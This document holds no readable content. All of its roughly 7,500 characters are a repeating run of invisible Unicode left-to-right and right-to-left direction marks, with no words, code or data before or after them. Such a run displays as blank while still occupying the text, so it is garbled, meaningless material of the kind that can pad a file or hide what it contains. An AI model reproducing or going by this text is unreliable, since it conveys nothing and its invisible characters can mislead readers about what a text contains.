‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎